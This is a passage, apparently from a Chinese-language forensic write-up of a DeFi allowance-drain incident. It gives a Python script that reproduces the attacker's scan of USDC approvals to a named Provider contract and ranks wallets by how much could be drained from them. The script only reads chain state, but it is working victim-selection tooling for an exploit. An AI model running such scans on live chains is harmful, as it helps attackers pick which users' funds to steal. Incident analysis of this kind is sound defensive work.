从授权者从筛选受害者候选 有授权残留并且账上有钱的就是候选受害者 drainable(user) = min( USDC.balanceOf(user), USDC.allowance(user, Provider) ) &gt; 0 变现扫描脚本 #!/usr/bin/env python3 &#34;&#34;&#34; Phase 2 — reproduce the attacker&#39;s approval scan. For every candidate owner (from Dune Phase 1), read at PRE_BLOCK: USDC.allowance(owner, Provider) &lt;- authoritative standing allowance USDC.balanceOf(owner) and compute: drainable = min(allowance, balance) (raw integer, 6-dp USDC units) An owner is harvestable via _takeUnderlying &lt;=&gt; drainable &gt; 0. Usage: export RPC_ETH=... # archive node (Alchemy) python3 phase2_scan.py &#34;&#34;&#34; import csv import os import subprocess import sys from pathlib import Path # ---- constants ---- USDC = &#34;0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&#34; PROVIDER = &#34;0xDAA037F99d168b552c0c61B7Fb64cF7819D78310&#34; BLOCK = &#34;25535119&#34; # PRE_BLOCK = attack block - 1 INF_THRESHOLD = 1 &lt;&lt; 200 # anything above this = &#34;infinite&#34; approval HERE = Path(__file__).resolve().parent CAND_FILE = HERE / &#34;dune_query_approve.txt&#34; OUT_FILE = HERE / &#34;phase2_drainable.csv&#34; RPC = os.environ.get(&#34;RPC_ETH&#34;) CAST = os.environ.get(&#34;CAST_BIN&#34;, &#34;cast&#34;) # falls back to PATH def cast_uint(sig, *args): &#34;&#34;&#34;Call a uint256-returning view fn at BLOCK, return int (with 1 retry).&#34;&#34;&#34; cmd = [CAST, &#34;call&#34;, USDC, sig, *args, &#34;--block&#34;, BLOCK, &#34;--rpc-url&#34;, RPC] err = &#34;&#34; for _ in range(2): try: out = subprocess.run(cmd, capture_output=True, text=True, timeout=60) if out.returncode == 0 and out.stdout.strip(): # cast may print &#34;1000000 [1e6]&#34; -&gt; take first token, drop commas return int(out.stdout.strip().split()[0].replace(&#34;,&#34;, &#34;&#34;)) err = out.stderr.strip() except subprocess.TimeoutExpired: err = &#34;timeout&#34; print(f&#34; ! call failed ({sig} {args}): {err}&#34;, file=sys.stderr) return None def main(): if not RPC: sys.exit(&#34;ERROR: set RPC_ETH to an archive node before running.&#34;) owners = [ln.strip() for ln in CAND_FILE.read_text().splitlines() if ln.strip()] print(f&#34;scanning {len(owners)} candidates at block {BLOCK} ...&#34;, file=sys.stderr) rows = [] for i, owner in enumerate(owners, 1): allowance = cast_uint(&#34;allowance(address,address)(uint256)&#34;, owner, PROVIDER) balance = cast_uint(&#34;balanceOf(address)(uint256)&#34;, owner) if allowance is None or balance is None: continue drainable = min(allowance, balance) rows.append({ &#34;owner&#34;: owner, &#34;balance&#34;: balance, &#34;allowance&#34;: allowance, &#34;infinite&#34;: allowance &gt; INF_THRESHOLD, &#34;drainable&#34;: drainable, }) print(f&#34; [{i}/{len(owners)}] {owner} drainable={drainable}&#34;, file=sys.stderr) rows.sort(key=lambda r: r[&#34;drainable&#34;], reverse=True) # ---- print table (raw integer units) ---- print(&#34;
{:&gt;3} {:&lt;44} {:&gt;18} {:&gt;10} {:&gt;18}&#34;.format( &#34;#&#34;, &#34;owner&#34;, &#34;balance&#34;, &#34;inf&#34;, &#34;drainable&#34;)) total_drainable = 0 positive = 0 for idx, r in enumerate(rows, 1): if r[&#34;drainable&#34;] &gt; 0: positive += 1 total_drainable += r[&#34;drainable&#34;] print(&#34;{:&gt;3} {:&lt;44} {:&gt;18} {:&gt;10} {:&gt;18}&#34;.format( idx, r[&#34;owner&#34;], r[&#34;balance&#34;], &#34;INF&#34; if r[&#34;infinite&#34;] else &#34;-&#34;, r[&#34;drainable&#34;])) # ---- summary ---- print(&#34;
--- summary ---&#34;) print(f&#34;candidates scanned : {len(rows)}&#34;) print(f&#34;drainable &gt; 0 : {positive}&#34;) print(f&#34;total drainable : {total_drainable}&#34;) # ---- dump csv (all raw) ---- with open(OUT_FILE, &#34;w&#34;, newline=&#34;&#34;) as f: w = csv.writer(f) w.writerow([&#34;owner&#34;, &#34;balance&#34;, &#34;allowance&#34;, &#34;infinite&#34;, &#34;drainable&#34;]) for r in rows: w.writerow([r[&#34;owner&#34;], r[&#34;balance&#34;], r[&#34;allowance&#34;], r[&#34;infinite&#34;], r[&#34;drainable&#34;]]) print(f&#34;
